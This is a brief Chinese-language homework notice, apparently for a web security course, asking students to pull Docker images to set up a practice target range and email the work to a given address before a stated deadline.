Docker：拉镜像，搭靶场
......
```

截止时间：web第二节课上课之前（1.31之前）

将作业发至邮箱 843165112@qq.com

